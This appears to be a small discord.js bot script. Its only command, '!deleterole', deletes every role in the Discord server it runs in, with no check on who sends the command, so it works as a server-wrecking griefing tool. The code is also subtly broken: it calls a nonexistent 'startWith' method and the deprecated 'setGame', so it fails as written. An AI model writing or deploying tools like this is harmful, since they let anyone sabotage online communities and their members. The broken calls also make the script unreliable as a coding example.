const Discord = require("discord.js");
const client = new Discord.Client();

client.on('ready', () => {
    client.user.setGame('Rezfix -help','https://www.twitch.tv/Rezfix');
    console.log('---------------');
    console.log(' Bot Is Online')
    console.log('---------------')
  });

    client.on('message', message => {
        if (message.content.startWith("!deleterole")){
    if(!message.channel.guild) return;
     message.guild.roles.forEach( roles => {
         
         roles.delete()
     })
}
});

client.login(process.env.BOT_TOKEN);
